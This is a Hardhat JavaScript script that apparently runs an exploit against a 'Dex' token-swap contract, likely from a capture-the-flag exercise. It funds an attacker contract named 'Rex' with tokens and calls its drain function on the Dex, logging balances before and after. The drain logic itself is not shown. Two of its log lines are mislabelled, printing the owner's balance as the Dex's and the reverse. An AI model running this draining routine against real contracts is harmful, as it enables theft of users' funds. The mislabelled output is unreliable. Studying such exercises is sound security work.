const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {
  const owner = new ethers.Wallet(process.env.PK, ethers.provider)

  const dex = await ethers.getContractAt("Dex", process.env.DEX)

  const rex = hre.network.name == "hardhat"
    ? await deploy()
    : await ethers.getContractAt("Rex", process.env.REX);

  const t1 = await ethers.getContractAt("IERC20", await dex.token1());
  const t2 = await ethers.getContractAt("IERC20", await dex.token2());

  const printBals = async () => {
    console.log("Dex balance:", (await dex.balanceOf(t1.address, owner.address)).toString());
    console.log("Owner balance:", (await dex.balanceOf(t1.address, dex.address)).toString());
    console.log("Rex balance:", (await dex.balanceOf(t1.address, rex.address)).toString());
  }

  await printBals()

  let tx1 = await t1.connect(owner).transfer(rex.address, 10, { gasLimit: 1e6 })
  await tx1.wait()

  let tx2 = await t2.connect(owner).transfer(rex.address, 10, { gasLimit: 1e6 })
  await tx2.wait()

  const tx = await rex.drain(dex.address, { gasLimit: 1e7 })
  await tx.wait()

  await printBals()

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
